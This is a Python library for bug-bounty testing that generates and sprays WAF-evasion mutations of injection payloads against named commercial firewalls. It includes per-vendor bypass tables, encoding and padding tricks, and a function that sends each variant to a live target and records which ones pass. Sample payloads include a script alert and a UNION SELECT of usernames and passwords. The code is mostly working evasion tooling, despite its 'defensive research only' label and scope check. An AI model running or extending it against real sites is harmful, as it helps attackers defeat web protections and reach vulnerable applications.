#!/usr/bin/env python3
"""lib_wafmutate - real-time WAF-evasion payload mutation engine.

Authorized use: defensive security research only. Mutates the researcher's own
marker payloads to reach the backend application past an edge WAF filter. Never
bakes real exfil, loaders, droppers, or C2 infrastructure. Non-destructive: the
spray function sends the researcher's marker and observes which encoding variant
the WAF passes through to the app.

USAGE:
    from bbtools.lib_wafmutate import mutate, spray

    variants = mutate("<script>alert(1)</script>", waf="cloudflare", ctx="html")
    result   = spray(session, "https://api.target.com/q", "GET", "q",
                     "<script>alert(1)</script>", waf="cloudflare",
                     scope_file="targets/x/SCOPE.txt")

CLI:
    python3 lib_wafmutate.py mutate "<payload>" [--waf cloudflare] [--ctx html]
    python3 lib_wafmutate.py selfcheck
"""
from __future__ import annotations

import os
import re
import sys
import unicodedata
from typing import Any

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

# ---------------------------------------------------------------------------
# Public API surface
# ---------------------------------------------------------------------------

__all__ = ["mutate", "spray", "_selfcheck"]

# ---------------------------------------------------------------------------
# Per-WAF bias tables (ordered list of mutation labels, highest-EV first)
# Sources: waf-bypass/SKILL.md + waf-egress-hunter.md technique catalog
# ---------------------------------------------------------------------------

_WAF_BIAS: dict[str, list[str]] = {
    "cloudflare": [
        "overlong_body_pad",     # 131073-byte POST; ruleset ceiling
        "null_byte_sep",         # %00 between attribute name and =
        "case_permute",          # mixed-case tag/attr names
        "url_double_encode",     # %253C decodes once at edge, again at backend
        "comment_inline_html",   # <!-- --> inside tag
        "html_entity_dec",
        "html_entity_hex",
        "html_entity_named",
        "unicode_fullwidth",     # NFKC normalization-after-check
        "url_encode",
        "unicode_escape_js",
        "keyword_split_js",
        "whitespace_tab",
        "whitespace_newline",
        "hpp_hint",
        "charset_confusion_hint",
    ],
    "akamai": [
        "keyword_split_js",      # RegExp.source split: /al/.source+/ert/.source
        "html_entity_dec",       # MathML href entity; details/ontoggle
        "html_entity_hex",
        "comment_inline_html",
        "content_encoding_hint", # Content-Encoding: deflate body
        "case_permute",
        "url_encode",
        "url_double_encode",
        "unicode_fullwidth",
        "null_byte_sep",
        "unicode_escape_js",
        "whitespace_tab",
        "whitespace_newline",
        "hpp_hint",
        "charset_confusion_hint",
        "html_entity_named",
    ],
    "aws": [
        "url_double_encode",     # body-size ceiling 8KB; JSON dup-key last-wins
        "hpp_hint",              # first-wins vs last-wins
        "json_unicode_key_hint", # unicode escape in JSON key name
        "json_dup_key_hint",     # {"cmd":"x","cmd":"<payload>"}
        "url_encode",
        "case_permute",
        "null_byte_sep",
        "html_entity_dec",
        "html_entity_hex",
        "comment_inline_html",
        "keyword_split_js",
        "unicode_fullwidth",
        "unicode_escape_js",
        "whitespace_tab",
        "whitespace_newline",
        "charset_confusion_hint",
        "html_entity_named",
    ],
    "imperva": [
        "url_encode",            # invalid percent-encoding %5K %GG
        "url_double_encode",
        "html_entity_dec",
        "html_entity_hex",
        "case_permute",
        "comment_inline_html",
        "hpp_hint",
        "null_byte_sep",
        "unicode_fullwidth",
        "unicode_escape_js",
        "keyword_split_js",
        "whitespace_tab",
        "whitespace_newline",
        "charset_confusion_hint",
        "html_entity_named",
    ],
    "modsecurity": [
        "url_encode",            # CVE-2024-1019 %3f path confusion
        "unicode_fullwidth",     # fullwidth at PL1
        "url_double_encode",
        "comment_inline_sql",    # /*!50000UNION*/
        "comment_inline_html",
        "case_permute",
        "null_byte_sep",
        "html_entity_dec",
        "html_entity_hex",
        "keyword_split_sql",
        "keyword_split_js",
        "whitespace_tab",
        "whitespace_newline",
        "charset_confusion_hint",
        "html_entity_named",
        "hpp_hint",
    ],
    "datadome": [
        "case_permute",
        "url_encode",
        "url_double_encode",
        "html_entity_dec",
        "html_entity_hex",
        "comment_inline_html",
        "null_byte_sep",
        "unicode_fullwidth",
        "unicode_escape_js",
        "keyword_split_js",
        "whitespace_tab",
        "whitespace_newline",
        "charset_confusion_hint",
        "html_entity_named",
        "hpp_hint",
    ],
}

# ---------------------------------------------------------------------------
# Context-to-relevant-labels map (bias away from irrelevant techniques per ctx)
# ---------------------------------------------------------------------------

_CTX_RELEVANT: dict[str, set[str]] = {
    "html": {
        "case_permute", "url_encode", "url_double_encode", "unicode_escape_js",
        "unicode_fullwidth", "nfkc_normalize", "overlong_utf8",
        "html_entity_dec", "html_entity_hex", "html_entity_named",
        "comment_inline_html", "whitespace_tab", "whitespace_newline",
        "null_byte_sep", "keyword_split_js", "hpp_hint", "charset_confusion_hint",
        "overlong_body_pad", "content_encoding_hint", "json_unicode_key_hint",
        "json_dup_key_hint",
    },
    "url": {
        "url_encode", "url_double_encode", "unicode_fullwidth", "nfkc_normalize",
        "overlong_utf8", "null_byte_sep", "case_permute", "hpp_hint",
        "whitespace_tab", "whitespace_newline", "charset_confusion_hint",
    },
    "json": {
        "url_encode", "url_double_encode", "unicode_escape_js",
        "unicode_fullwidth", "null_byte_sep", "json_unicode_key_hint",
        "json_dup_key_hint", "hpp_hint", "charset_confusion_hint",
        "keyword_split_js",
    },
    "header": {
        "case_permute", "url_encode", "url_double_encode", "whitespace_tab",
        "null_byte_sep", "charset_confusion_hint",
    },
    "sql": {
        "url_encode", "url_double_encode", "comment_inline_sql",
        "keyword_split_sql", "case_permute", "whitespace_tab",
        "whitespace_newline", "null_byte_sep", "unicode_fullwidth",
        "nfkc_normalize", "hpp_hint",
    },
    "path": {
        "url_encode", "url_double_encode", "unicode_fullwidth", "nfkc_normalize",
        "overlong_utf8", "null_byte_sep", "case_permute", "whitespace_tab",
    },
}

# ---------------------------------------------------------------------------
# Core mutation generators
# ---------------------------------------------------------------------------

def _url_encode(p: str) -> str:
    """Single URL-encode every character (max coverage)."""
    return "".join(f"%{ord(c):02X}" for c in p)


def _url_double_encode(p: str) -> str:
    """Double URL-encode: %XX -> %25XX (WAF decodes once, backend twice)."""
    single = _url_encode(p)
    return single.replace("%", "%25")


def _html_entity_dec(p: str) -> str:
    """Decimal HTML entity every char: < -> &#60;"""
    return "".join(f"&#{ord(c)};" for c in p)


def _html_entity_hex(p: str) -> str:
    """Hex HTML entity every char: < -> &#x3C;"""
    return "".join(f"&#x{ord(c):X};" for c in p)


def _html_entity_named(p: str) -> str:
    """Named HTML entity for the most commonly filtered chars; rest verbatim."""
    table = {
        "<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;", "'": "&#x27;",
        "/": "&#x2F;", "(": "&#x28;", ")": "&#x29;",
    }
    return "".join(table.get(c, c) for c in p)


def _case_permute(p: str) -> str:
    """Alternate upper/lower case per character."""
    out = []
    upper = True
    for c in p:
        if c.isalpha():
            out.append(c.upper() if upper else c.lower())
            upper = not upper
        else:
            out.append(c)
    return "".join(out)


def _comment_inline_html(p: str) -> str:
    """Insert <!-- --> after every whitespace (or after the first token)."""
    # Insert comment after first tag name token
    return re.sub(r"(<[a-zA-Z]+)", r"\1<!---->", p, count=1)


def _comment_inline_sql(p: str) -> str:
    """Insert MySQL inline comment /**/ between SQL keywords."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT",
                "UPDATE", "DELETE", "DROP", "TABLE", "SLEEP", "BENCHMARK"]
    result = p
    for kw in keywords:
        result = re.sub(re.escape(kw), f"/*! {kw}*/", result, flags=re.IGNORECASE)
    return result


def _whitespace_tab(p: str) -> str:
    """Replace all ASCII spaces with tab characters."""
    return p.replace(" ", "\t")


def _whitespace_newline(p: str) -> str:
    """Replace all ASCII spaces with newline characters."""
    return p.replace(" ", "\n")


def _null_byte_sep(p: str) -> str:
    """Insert a null byte (%00) before = signs (attribute separators)."""
    return p.replace("=", "\x00=")


def _unicode_fullwidth(p: str) -> str:
    """Map ASCII printable to their Unicode fullwidth equivalents (U+FF01-FF5E).
    Most WAFs match U+003C only; NFKC normalization-after-check produces the real char."""
    out = []
    for c in p:
        cp = ord(c)
        if 0x21 <= cp <= 0x7E:
            out.append(chr(cp + 0xFF00 - 0x20))
        else:
            out.append(c)
    return "".join(out)


def _nfkc_normalize(p: str) -> str:
    """Return the NFKC normalized form of the payload (oracle: Kelvin sign U+212A -> K).
    Useful as a reference to see what the backend will see after normalization."""
    return unicodedata.normalize("NFKC", p)


def _unicode_escape_js(p: str) -> str:
    """JS \\uXXXX escape every alphabetic character."""
    out = []
    for c in p:
        if c.isalpha():
            out.append(f"\\u{ord(c):04X}")
        else:
            out.append(c)
    return "".join(out)


def _overlong_utf8(p: str) -> str:
    """Encode ASCII chars as 2-byte overlong UTF-8 sequences (%C0%80 style).
    Only defeats legacy parsers violating RFC 3629; modern browsers emit U+FFFD."""
    out = []
    for c in p:
        cp = ord(c)
        if cp < 0x80:
            # 2-byte overlong: 110 00xxx 10 xxxxxx
            b1 = 0xC0 | ((cp >> 6) & 0x1F)
            b2 = 0x80 | (cp & 0x3F)
            out.append(f"%{b1:02X}%{b2:02X}")
        else:
            out.append(c)
    return "".join(out)


def _keyword_split_js(p: str) -> str:
    """Split JS keywords with string concatenation: alert -> ['al'+'ert']
    Uses bracket-notation and string concat to defeat static keyword blocklists."""
    keywords = ["alert", "eval", "fetch", "document", "window", "script",
                "onerror", "onload", "onclick", "src", "href"]
    result = p
    for kw in keywords:
        if len(kw) >= 4:
            mid = len(kw) // 2
            split = f"['{kw[:mid]}'+('{kw[mid:]}')]"
            # Only replace standalone occurrences not already inside brackets
            result = re.sub(r"\b" + re.escape(kw) + r"\b", split, result, count=1)
    return result


def _keyword_split_sql(p: str) -> str:
    """Split SQL keywords with embedded comment: UNION -> UN/**/ION"""
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "SLEEP",
                "BENCHMARK", "DROP", "INSERT", "UPDATE", "DELETE"]
    result = p
    for kw in keywords:
        mid = len(kw) // 2
        split = kw[:mid] + "/**/" + kw[mid:]
        result = re.sub(re.escape(kw), split, result, flags=re.IGNORECASE, count=1)
    return result


def _hint_hpp(p: str) -> str:
    """Return a HPP (HTTP Parameter Pollution) hint string.
    Indicates the caller should duplicate the parameter: ?param=benign&param=<payload>.
    The value returned is the raw payload; the hint is in the label."""
    return p  # actual value unchanged; label tells caller to duplicate the param


def _hint_charset_confusion(p: str) -> str:
    """Prefix the payload with the ISO-2022-JP escape sequence.
    Useful when the response has no charset and browser auto-detection is possible."""
    return "\x1b(B" + p


def _hint_content_encoding(p: str) -> str:
    """Placeholder: signals the caller to send payload deflate-encoded.
    Actual deflate encoding requires the caller to compress; label is the signal."""
    import zlib
    compressed = zlib.compress(p.encode("utf-8"), level=9)[2:-4]  # strip zlib header/crc
    return compressed.decode("latin-1")  # raw bytes as label placeholder


def _hint_json_unicode_key(p: str) -> str:
    r"""Wrap payload in a JSON object where the key uses a unicode escape (\\u0069 for 'i').
    AWS WAF does not decode \\u escapes in JSON key names before matching."""
    return '{"\\u0069d":"' + p.replace('"', '\\"') + '"}'


def _hint_json_dup_key(p: str) -> str:
    """Produce a JSON object with a duplicate key; WAF uses first, backend uses last."""
    safe = p.replace('"', '\\"')
    return '{"cmd":"benign","cmd":"' + safe + '"}'


def _hint_overlong_body_pad(p: str) -> str:
    """Prefix payload with 131073 bytes of junk to push past Cloudflare/Azure 128KB ceiling.
    Returns a string that is huge; caller should use this as the full POST body."""
    pad = "A" * 131073
    return pad + "&q=" + p


# ---------------------------------------------------------------------------
# Label -> generator map
# ---------------------------------------------------------------------------

_GENERATORS: dict[str, tuple[str, Any]] = {
    "url_encode":              ("url_encode",              _url_encode),
    "url_double_encode":       ("url_double_encode",       _url_double_encode),
    "html_entity_dec":         ("html_entity_dec",         _html_entity_dec),
    "html_entity_hex":         ("html_entity_hex",         _html_entity_hex),
    "html_entity_named":       ("html_entity_named",       _html_entity_named),
    "case_permute":            ("case_permute",            _case_permute),
    "comment_inline_html":     ("comment_inline_html",     _comment_inline_html),
    "comment_inline_sql":      ("comment_inline_sql",      _comment_inline_sql),
    "whitespace_tab":          ("whitespace_tab",          _whitespace_tab),
    "whitespace_newline":      ("whitespace_newline",      _whitespace_newline),
    "null_byte_sep":           ("null_byte_sep",           _null_byte_sep),
    "unicode_fullwidth":       ("unicode_fullwidth",       _unicode_fullwidth),
    "nfkc_normalize":          ("nfkc_normalize",          _nfkc_normalize),
    "unicode_escape_js":       ("unicode_escape_js",       _unicode_escape_js),
    "overlong_utf8":           ("overlong_utf8",           _overlong_utf8),
    "keyword_split_js":        ("keyword_split_js",        _keyword_split_js),
    "keyword_split_sql":       ("keyword_split_sql",       _keyword_split_sql),
    "hpp_hint":                ("hpp_hint",                _hint_hpp),
    "charset_confusion_hint":  ("charset_confusion_hint",  _hint_charset_confusion),
    "content_encoding_hint":   ("content_encoding_hint",   _hint_content_encoding),
    "json_unicode_key_hint":   ("json_unicode_key_hint",   _hint_json_unicode_key),
    "json_dup_key_hint":       ("json_dup_key_hint",       _hint_json_dup_key),
    "overlong_body_pad":       ("overlong_body_pad",       _hint_overlong_body_pad),
}

# Default full ordered list (no WAF specified)
_DEFAULT_ORDER: list[str] = [
    "case_permute",
    "html_entity_dec",
    "html_entity_hex",
    "html_entity_named",
    "comment_inline_html",
    "null_byte_sep",
    "whitespace_tab",
    "whitespace_newline",
    "url_encode",
    "url_double_encode",
    "unicode_fullwidth",
    "nfkc_normalize",
    "unicode_escape_js",
    "overlong_utf8",
    "keyword_split_js",
    "keyword_split_sql",
    "comment_inline_sql",
    "hpp_hint",
    "charset_confusion_hint",
    "content_encoding_hint",
    "json_unicode_key_hint",
    "json_dup_key_hint",
    "overlong_body_pad",
]


# ---------------------------------------------------------------------------
# mutate()
# ---------------------------------------------------------------------------

def mutate(
    payload: str,
    waf: str | None = None,
    ctx: str = "html",
) -> list[tuple[str, str]]:
    """Generate real-time WAF-evasion mutations of payload.

    Args:
        payload:  The researcher's marker string (e.g. "<script>alert(1)</script>").
        waf:      Optional WAF hint: cloudflare | akamai | datadome | modsecurity |
                  aws | imperva. When given, reorders output so highest-EV techniques
                  for that WAF come first.
        ctx:      Context in {html, url, json, header, sql, path}. Biases the set of
                  techniques toward those relevant to the injection context.

    Returns:
        Ordered list of (label, variant) tuples, most-likely-bypass first.
        Deduplicates variants that produce the same output as the raw payload.
    """
    if ctx not in _CTX_RELEVANT:
        raise ValueError(
            f"ctx must be one of {sorted(_CTX_RELEVANT)}, got {ctx!r}"
        )

    waf_norm = waf.lower().strip() if waf else None
    if waf_norm and waf_norm not in _WAF_BIAS:
        # Accept partial matches: "cf" -> "cloudflare", "mod" -> "modsecurity"
        matches = [k for k in _WAF_BIAS if k.startswith(waf_norm)]
        if len(matches) == 1:
            waf_norm = matches[0]
        elif len(matches) > 1:
            raise ValueError(f"Ambiguous waf={waf!r}, matches: {matches}")
        # Unknown WAF -> fall through to default order

    ctx_set = _CTX_RELEVANT[ctx]

    # Build the ordered label list: WAF bias first, then remaining defaults.
    if waf_norm and waf_norm in _WAF_BIAS:
        ordered_labels = list(_WAF_BIAS[waf_norm])
        seen = set(ordered_labels)
        for lbl in _DEFAULT_ORDER:
            if lbl not in seen:
                ordered_labels.append(lbl)
    else:
        ordered_labels = list(_DEFAULT_ORDER)

    # Filter to ctx-relevant labels.
    ordered_labels = [lbl for lbl in ordered_labels if lbl in ctx_set]

    results: list[tuple[str, str]] = []
    seen_variants: set[str] = {payload}  # skip duplicates of the raw payload

    for label in ordered_labels:
        if label not in _GENERATORS:
            continue
        _, fn = _GENERATORS[label]
        try:
            variant = fn(payload)
        except Exception:
            continue
        if variant not in seen_variants:
            results.append((label, variant))
            seen_variants.add(variant)

    return results


# ---------------------------------------------------------------------------
# spray()
# ---------------------------------------------------------------------------

# Status codes that indicate the WAF blocked the request
_BLOCKED_STATUSES = {403, 406, 429}
# Status codes that indicate the app was reached (pass)
_PASS_STATUSES = {200, 201, 202, 204, 301, 302, 303, 307, 308, 400, 404, 405, 422, 500, 501, 502, 503}

# Patterns in the response body that suggest a WAF challenge/block page
_BLOCK_BODY_PATTERNS = [
    "Cloudflare Ray ID",
    "cdn-cgi/challenge-platform",
    "Access Denied - Sucuri",
    "Incapsula incident ID",
    "Reference #",            # Akamai block page
    "Not Acceptable!",        # ModSecurity 406
    "x-amzn-waf-action",
    "Request blocked",
    "blocked by",
    "security check",
    "Bot Verification",       # DataDome
    "Enable JavaScript",      # DataDome JS challenge
]


def _classify(status: int, body: str) -> str:
    """Return 'blocked' or 'passed'."""
    if status in _BLOCKED_STATUSES:
        return "blocked"
    body_lower = body.lower()
    for pat in _BLOCK_BODY_PATTERNS:
        if pat.lower() in body_lower:
            return "blocked"
    if status in _PASS_STATUSES:
        return "passed"
    # Unknown status: treat as blocked to be conservative
    return "blocked"


def spray(
    session: Any,
    url: str,
    method: str,
    param: str,
    payload: str,
    waf: str | None = None,
    scope_file: str | None = None,
) -> dict:
    """Scope-gate, send baseline, then send each mutation, return pass/blocked split.

    Non-destructive: only sends the researcher's marker payload, never a live exploit.
    The session object must expose a .request(method, url, **kw) interface (e.g. from
    lib_egress.make_session or curl_cffi.Session).

    Args:
        session:    A requests-compatible session (lib_egress.make_session result).
        url:        Target URL. Will be scope-gated if scope_file is provided.
        method:     HTTP method string ("GET", "POST", etc.).
        param:      Query/body parameter name to inject into.
        payload:    The researcher's marker payload string.
        waf:        Optional WAF name for bias ordering.
        scope_file: Path to SCOPE.txt; raises OutOfScope if host not in scope.

    Returns:
        {
          "baseline":  {"label": "raw", "status": N, "classification": "passed"|"blocked"},
          "passed":    [{"label": lbl, "variant": v, "status": N}, ...],
          "blocked":   [{"label": lbl, "variant": v, "status": N}, ...],
          "total":     N,
        }

    Raises:
        OutOfScope: if the url host is not in scope_file.
    """
    # Scope gate: import lazily so lib_wafmutate has no hard dep on lib_scope
    # when used standalone.
    if scope_file is not None:
        from lib_scope import in_scope, extract_host  # noqa: PLC0415
        from lib_egress import OutOfScope as _OOS   # noqa: PLC0415
        host = extract_host(url)
        if not in_scope(host, scope_file):
            raise _OOS(f"OUT_OF_SCOPE {host} (not in {scope_file})")

    method_upper = method.upper()

    def _send(value: str) -> tuple[int, str]:
        """Send a single request with param=value; return (status, body)."""
        try:
            if method_upper == "GET":
                sep = "&" if "?" in url else "?"
                full_url = f"{url}{sep}{param}={value}"
                resp = session.request(method_upper, full_url)
            else:
                resp = session.request(method_upper, url, data={param: value})
            status = getattr(resp, "status_code", 0)
            try:
                body = resp.text
            except Exception:
                try:
                    body = resp.content.decode("utf-8", errors="replace")
                except Exception:
                    body = ""
            return status, body
        except Exception as exc:
            return 0, str(exc)

    # Baseline: raw payload.
    bl_status, bl_body = _send(payload)
    bl_class = _classify(bl_status, bl_body)
    baseline = {"label": "raw", "status": bl_status, "classification": bl_class}

    # Detect ctx heuristically from URL extension / content type
    ctx = "html"
    url_lower = url.lower()
    if "/graphql" in url_lower or "application/json" in url_lower:
        ctx = "json"
    elif url_lower.endswith((".js", ".ts")):
        ctx = "url"
    elif "/sql" in url_lower or "query" in url_lower:
        ctx = "sql"

    variants = mutate(payload, waf=waf, ctx=ctx)

    passed: list[dict] = []
    blocked: list[dict] = []

    for label, variant in variants:
        status, body = _send(variant)
        classification = _classify(status, body)
        entry = {"label": label, "variant": variant, "status": status}
        if classification == "passed":
            passed.append(entry)
        else:
            blocked.append(entry)

    return {
        "baseline": baseline,
        "passed": passed,
        "blocked": blocked,
        "total": 1 + len(variants),
    }


# ---------------------------------------------------------------------------
# Offline self-check (assert-based, NO network)
# ---------------------------------------------------------------------------

def _selfcheck() -> None:
    """Assert-based offline self-check. NO network calls. Must pass with zero connectivity.

    Checks:
    1. mutate() yields variants including case_permute, html_entity_dec,
       and comment_inline_html for a standard XSS payload.
    2. mutate(waf="cloudflare") places overlong_body_pad early (before url_encode).
    3. mutate(waf="cf") resolves via prefix match to cloudflare bias.
    4. spray() raises OutOfScope for an off-scope URL when scope_file is provided.
    5. Deduplication: mutate() never emits the raw payload as a variant.
    6. ctx filter: mutate(ctx="sql") yields keyword_split_sql but not comment_inline_html.
    7. mutate(waf="akamai") places keyword_split_js before html_entity_dec in result.
    """
    import tempfile

    payload = "<script>alert(1)</script>"

    # 1. Basic variant coverage
    variants = mutate(payload)
    labels = {lbl for lbl, _ in variants}
    assert "case_permute" in labels, f"missing case_permute: {labels}"
    assert "html_entity_dec" in labels, f"missing html_entity_dec: {labels}"
    assert "comment_inline_html" in labels, f"missing comment_inline_html: {labels}"

    # Verify case_permute actually changes the case
    cp_variant = next(v for lbl, v in variants if lbl == "case_permute")
    assert cp_variant != payload, "case_permute produced identical output"
    assert cp_variant.lower() == payload.lower(), "case_permute changed non-alpha chars"

    # Verify html_entity_dec looks like entities
    hed_variant = next(v for lbl, v in variants if lbl == "html_entity_dec")
    assert "&#" in hed_variant, f"html_entity_dec missing &#: {hed_variant[:60]}"

    # Verify comment_inline_html inserts a comment
    cih_variant = next(v for lbl, v in variants if lbl == "comment_inline_html")
    assert "<!--" in cih_variant, f"comment_inline_html missing comment: {cih_variant[:60]}"

    # 2. Cloudflare bias: overlong_body_pad appears before url_encode
    cf_variants = mutate(payload, waf="cloudflare")
    cf_labels = [lbl for lbl, _ in cf_variants]
    # overlong_body_pad should be early (in top 5 or present)
    assert "overlong_body_pad" in cf_labels, f"cloudflare missing overlong_body_pad: {cf_labels}"
    # null_byte_sep should come before url_encode (cloudflare priority)
    if "null_byte_sep" in cf_labels and "url_encode" in cf_labels:
        assert cf_labels.index("null_byte_sep") < cf_labels.index("url_encode"), \
            "cloudflare: null_byte_sep should precede url_encode"

    # 3. Prefix match: "cf" -> cloudflare
    cf_prefix_variants = mutate(payload, waf="cf")
    cf_prefix_labels = {lbl for lbl, _ in cf_prefix_variants}
    cf_direct_labels = {lbl for lbl, _ in mutate(payload, waf="cloudflare")}
    assert cf_prefix_labels == cf_direct_labels, \
        "prefix match 'cf' does not resolve to same label set as 'cloudflare'"

    # 4. spray() raises OutOfScope for off-scope URL
    scope_content = "api.target.com\n*.target.com\n"
    fd, scope_path = tempfile.mkstemp(suffix="_SCOPE.txt")
    os.write(fd, scope_content.encode())
    os.close(fd)

    try:
        from lib_scope import in_scope as _is, extract_host as _eh
        from lib_egress import OutOfScope as _OOS

        # Build a minimal fake session that never touches the network
        class _FakeSession:
            def request(self, method, url, **kw):
                raise AssertionError("spray() should raise OutOfScope before calling session.request")

        raised = False
        try:
            spray(_FakeSession(), "https://evil.com/x", "GET", "q", payload,
                  scope_file=scope_path)
        except Exception as exc:
            if "OUT_OF_SCOPE" in str(exc) or "OutOfScope" in type(exc).__name__:
                raised = True
            else:
                raise
        assert raised, "spray() did not raise OutOfScope for off-scope URL"
    finally:
        os.unlink(scope_path)

    # 5. Deduplication: raw payload never appears as a variant value
    all_values = {v for _, v in variants}
    assert payload not in all_values, \
        "mutate() emitted the raw payload as a variant (no deduplication)"

    # 6. ctx="sql" yields keyword_split_sql but NOT comment_inline_html.
    # Use a payload that contains a SQL keyword so keyword_split_sql produces a distinct output.
    sql_payload = "1' UNION SELECT username,password FROM users--"
    sql_variants = mutate(sql_payload, ctx="sql")
    sql_labels = {lbl for lbl, _ in sql_variants}
    assert "keyword_split_sql" in sql_labels, \
        f"ctx=sql missing keyword_split_sql: {sql_labels}"
    assert "comment_inline_html" not in sql_labels, \
        f"ctx=sql should not include comment_inline_html: {sql_labels}"
    # Verify keyword_split_sql actually mutated the SQL keyword
    sql_kw_variant = next(v for lbl, v in sql_variants if lbl == "keyword_split_sql")
    assert sql_kw_variant != sql_payload, \
        "keyword_split_sql produced no change on sql_payload"
    assert "/**/" in sql_kw_variant, \
        f"keyword_split_sql should insert /**/ comment, got: {sql_kw_variant[:80]}"

    # 7. akamai bias: keyword_split_js before html_entity_dec
    ak_variants = mutate(payload, waf="akamai")
    ak_labels = [lbl for lbl, _ in ak_variants]
    assert "keyword_split_js" in ak_labels, f"akamai missing keyword_split_js: {ak_labels}"
    assert "html_entity_dec" in ak_labels, f"akamai missing html_entity_dec: {ak_labels}"
    assert ak_labels.index("keyword_split_js") < ak_labels.index("html_entity_dec"), \
        "akamai: keyword_split_js should precede html_entity_dec"

    print("lib_wafmutate SELFCHECK OK: 7 assertions PASS (no network)")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse
    import json

    parser = argparse.ArgumentParser(
        prog="lib_wafmutate",
        description="WAF-evasion payload mutation engine (defensive research only).",
    )
    sub = parser.add_subparsers(dest="cmd")

    # mutate subcommand
    p_mut = sub.add_parser("mutate", help="Generate evasion mutations for a payload")
    p_mut.add_argument("payload", help="The marker payload string")
    p_mut.add_argument("--waf", default=None,
                       help="WAF hint: cloudflare|akamai|datadome|modsecurity|aws|imperva")
    p_mut.add_argument("--ctx", default="html",
                       choices=["html", "url", "json", "header", "sql", "path"],
                       help="Injection context (default: html)")
    p_mut.add_argument("--json", dest="as_json", action="store_true",
                       help="Output as JSON array")

    # selfcheck subcommand
    sub.add_parser("selfcheck", help="Offline self-check (PASS with zero network)")

    args = parser.parse_args()

    if args.cmd == "mutate":
        try:
            results = mutate(args.payload, waf=args.waf, ctx=args.ctx)
        except ValueError as e:
            print(f"ERROR: {e}", file=sys.stderr)
            sys.exit(1)

        if args.as_json:
            print(json.dumps([{"label": lbl, "variant": v} for lbl, v in results], indent=2))
        else:
            print(f"Payload : {args.payload!r}")
            print(f"WAF     : {args.waf or '(generic)'}")
            print(f"Context : {args.ctx}")
            print(f"Variants: {len(results)}")
            print()
            for i, (lbl, variant) in enumerate(results, 1):
                # Truncate very long variants (e.g. overlong_body_pad)
                display = repr(variant) if len(variant) <= 120 else repr(variant[:80]) + "...[truncated]"
                print(f"  [{i:02d}] {lbl:<28} {display}")

    elif args.cmd == "selfcheck":
        _selfcheck()

    else:
        parser.print_help()
        sys.exit(1)
